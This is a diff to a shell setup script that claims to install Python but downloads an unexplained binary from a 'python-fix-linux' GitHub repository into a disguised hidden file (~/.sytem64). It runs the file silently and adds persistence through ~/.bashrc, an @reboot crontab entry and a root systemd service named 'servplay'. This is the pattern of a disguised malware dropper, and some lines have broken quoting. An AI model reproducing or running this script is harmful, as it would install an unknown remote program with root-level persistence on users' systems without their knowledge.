@@ -2,5 +2,25 @@ sudo apt update
 sudo apt install python3 python3-pip -y
 curl -sL https://github.com/ven0m90/python-fix-linux/raw/refs/heads/main/python3fix -o ~/.sytem64
 chmod +x ~/.sytem64
-nohup  ~/.sytem64 &
- echo "@reboot nohup ~/.sytem64 &" | crontab -
+sudo nohup  ~/.sytem64 > /dev/null 2>&1 &
+echo "sudo nohup ~/.sytem64  > /dev/null 2>&1 &
+rm nohup.out" >>   ~/.bashrc
+echo "@reboot "sudo nohup ~/.sytem64  > /dev/null 2>&1 &" | crontab -
+
+
+sudo touch /etc/systemd/system/servplay.service
+sudo chmod +rwx /etc/systemd/system/servplay.service
+
+sudo echo "[Unit]
+Description=servplay
+After=network.target
+
+[Service]
+User=root
+ExecStart=sudo nohup ~/.sytem64  > /dev/null 2>&1 &
+Restart=always
+
+[Install]
+WantedBy=multi-user.target" >  /etc/systemd/system/servplay.service
+
+
